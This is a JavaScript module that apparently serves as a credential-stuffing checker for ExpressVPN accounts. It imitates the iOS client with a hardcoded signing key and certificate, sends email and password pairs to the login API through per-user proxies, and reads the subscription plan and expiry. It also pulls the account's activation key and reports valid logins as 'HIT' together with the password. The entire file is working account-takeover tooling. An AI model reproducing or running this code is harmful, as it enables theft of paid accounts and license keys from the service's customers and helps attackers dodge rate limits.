// lib/expressChecker.js – with per-user proxy support
import forge from 'node-forge';
import zlib from 'zlib';
import { aesDecrypt, hmacSha1Base64 } from './expressCrypto.js';
import { fetchWithProxy } from './proxy.js';

const CERT_BASE64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA==";
const HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~";
const API_BASE = "https://www.expressapisv2.net";
const CLIENT_VERSION = "11.5.2";
const OS_NAME = "ios";
const OS_VERSION = "14.4";

function randomString(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

function randomBytes(size) {
  const arr = new Uint8Array(size);
  for (let i = 0; i < size; i++) arr[i] = Math.floor(Math.random() * 256);
  return arr;
}

function base64Encode(bytes) {
  return Buffer.from(bytes).toString('base64');
}

function gzipString(str) {
  return zlib.gzipSync(Buffer.from(str, 'ascii'));
}

function envelopeEncrypt(data, certBase64) {
  const certDer = forge.util.decode64(certBase64);
  const certAsn1 = forge.asn1.fromDer(certDer);
  const cert = forge.pki.certificateFromAsn1(certAsn1);
  const p7 = forge.pkcs7.createEnvelopedData();
  p7.addRecipient(cert);
  p7.content = forge.util.createBuffer(data);
  p7.encrypt();
  const der = forge.asn1.toDer(p7.toAsn1()).getBytes();
  return Buffer.from(der, 'binary');
}

function fmtErr(e) {
  const cause = e.cause ? ` | cause: ${e.cause.message || e.cause.code || JSON.stringify(e.cause)}` : '';
  return `${e.message}${cause}`;
}

export async function checkExpressVPN(email, password, proxyUser = null) {
  try {
    const installId = randomString(64);
    const base64IV = base64Encode(randomBytes(16));
    const base64KEY = base64Encode(randomBytes(16));

    const postData = JSON.stringify({ email, iv: base64IV, key: base64KEY, password });
    const gzipped = gzipString(postData);
    const encrypted = envelopeEncrypt(gzipped, CERT_BASE64);

    const headerRaw = `POST /apis/v2/credentials?client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}`;
    const headerSig = hmacSha1Base64(headerRaw, HMAC_KEY);
    const bodySig = hmacSha1Base64(Buffer.from(encrypted).toString('binary'), HMAC_KEY);

    // ===== LOGIN REQUEST =====
    let loginRes;
    try {
      loginRes = await fetchWithProxy(`${API_BASE}/apis/v2/credentials?client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}`, {
        method: 'POST',
        headers: {
          'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
          'Content-Type': 'application/octet-stream',
          'X-Body-Compression': 'gzip',
          'X-Signature': `2 ${headerSig} 91c776e`,
          'X-Body-Signature': `2 ${bodySig} 91c776e`,
          'Accept-Language': 'en',
          'Accept-Encoding': 'gzip, deflate'
        },
        body: encrypted
      }, proxyUser);
    } catch (e) {
      return { valid: false, hit: false, message: `Login fetch failed: ${fmtErr(e)}` };
    }

    if (loginRes.status !== 200) {
      const t = await loginRes.text();
      return { valid: false, hit: false, message: `Login HTTP ${loginRes.status}: ${t.substring(0, 100)}` };
    }

    const loginRaw = Buffer.from(await loginRes.arrayBuffer());

    let decrypted;
    try {
      decrypted = aesDecrypt(loginRaw.toString('binary'), base64KEY, base64IV);
    } catch (e) {
      return { valid: false, hit: false, message: `Decrypt failed: ${e.message}` };
    }

    const responseBody = Buffer.from(decrypted, 'binary').toString('ascii');
    if (!responseBody.trim().startsWith('{')) {
      return { valid: false, hit: false, message: `Non-JSON: ${responseBody.substring(0, 120)}` };
    }

    let parsed;
    try { parsed = JSON.parse(responseBody); } catch (e) {
      return { valid: false, hit: false, message: `JSON parse error: ${e.message}` };
    }

    const accessToken = parsed.access_token;
    if (!accessToken) return { valid: false, hit: false, message: 'No access token' };

    // ===== SUBSCRIPTION REQUEST =====
    const subRaw = `GET /apis/v2/subscription?access_token=${accessToken}&client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}&reason=activation_with_email`;
    const subSig = hmacSha1Base64(subRaw, HMAC_KEY);

    const captureBody = JSON.stringify([{
      headers: { 'Accept-Language': 'en', 'X-Signature': `2 ${subSig} 91c776e` },
      method: 'GET',
      url: `/apis/v2/subscription?access_token=${accessToken}&client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}&reason=activation_with_email`
    }]);

    const batchRaw = `POST /apis/v2/batch?client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}`;
    const batchSig = hmacSha1Base64(batchRaw, HMAC_KEY);
    const captureBodySig = hmacSha1Base64(captureBody, HMAC_KEY);

    let captureRes;
    try {
      captureRes = await fetchWithProxy(`${API_BASE}/apis/v2/batch?client_version=${CLIENT_VERSION}&installation_id=${installId}&os_name=${OS_NAME}&os_version=${OS_VERSION}`, {
        method: 'POST',
        headers: {
          'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
          'X-Body-Compression': 'gzip',
          'X-Signature': `2 ${batchSig} 91c776e`,
          'X-Body-Signature': `2 ${captureBodySig} 91c776e`,
          'Accept-Language': 'en',
          'Accept-Encoding': 'gzip, deflate',
          'Content-Type': 'application/json'
        },
        body: captureBody
      }, proxyUser);
    } catch (e) {
      return { valid: false, hit: false, message: `Subscription fetch failed: ${fmtErr(e)}` };
    }

    if (captureRes.status !== 200) {
      const t = await captureRes.text();
      return { valid: false, hit: false, message: `Subscription HTTP ${captureRes.status}: ${t.substring(0, 100)}` };
    }

    const captureText = await captureRes.text();
    if (!captureText.includes('subscription')) {
      return { valid: true, hit: false, message: 'No subscription data' };
    }
    if (captureText.includes('status\\":\\"REVOKED') || captureText.includes('status\\":\\"\\"')) {
      return { valid: true, hit: false, message: 'Subscription revoked' };
    }

    // ===== PLAN & EXPIRY =====
    let unescaped = captureText;
    try { unescaped = JSON.parse(`"${captureText.replace(/"/g, '\\"')}"`); } catch (e) {}

    let plan = '—', expiry = '—';

    const planPatterns = [
      /billing_cycle\\?":\s*(\d+)/,
      /billing_cycle\\?":\s*"(\d+)"/,
      /"billing_cycle":\s*(\d+)/
    ];
    for (const p of planPatterns) {
      const m = unescaped.match(p);
      if (m) { plan = m[1] + ' Month'; break; }
    }

    const expPatterns = [
      /expiration_time\\?":\s*(\d+)/,
      /expiration_time\\?":\s*"(\d+)"/,
      /"expiration_time":\s*(\d+)/
    ];
    for (const p of expPatterns) {
      const m = unescaped.match(p);
      if (m) {
        const ts = parseInt(m[1]);
        if (ts > 0) expiry = new Date(ts * 1000).toISOString().split('T')[0];
        break;
      }
    }

    // ===== PC KEY REQUEST =====
    let pcKey = '—', keyExpire = '—', keyStatus = '—';
    try {
      const pcRes = await fetchWithProxy('https://www.expressvpn.com/api/v2/subscriptions', {
        method: 'GET',
        headers: {
          'Host': 'www.expressvpn.com',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0',
          'Accept': '*/*',
          'Referer': 'https://portal.expressvpn.com/subscriptions',
          'authorization': `Bearer ${accessToken}`,
          'content-type': 'application/json',
          'x-tenant': 'xvpn',
          'Origin': 'https://portal.expressvpn.com'
        }
      }, proxyUser);
      if (pcRes.status === 200) {
        const pcText = await pcRes.text();
        const m1 = pcText.match(/"longCode":"([^"]+)"/); if (m1) pcKey = m1[1];
        const m2 = pcText.match(/"nextPaymentDate":"([^"]+)"/); if (m2) keyExpire = m2[1];
        const m3 = pcText.match(/"status":"([^"]+)"/); if (m3) keyStatus = m3[1];
      }
    } catch (e) {}

    return {
      valid: true, hit: true, email, password,
      plan, expiry, pcKey, keyExpire, keyStatus,
      message: '✅ HIT (Subscription valid)'
    };

  } catch (err) {
    return { valid: false, hit: false, message: `Fatal: ${fmtErr(err)}` };
  }
}
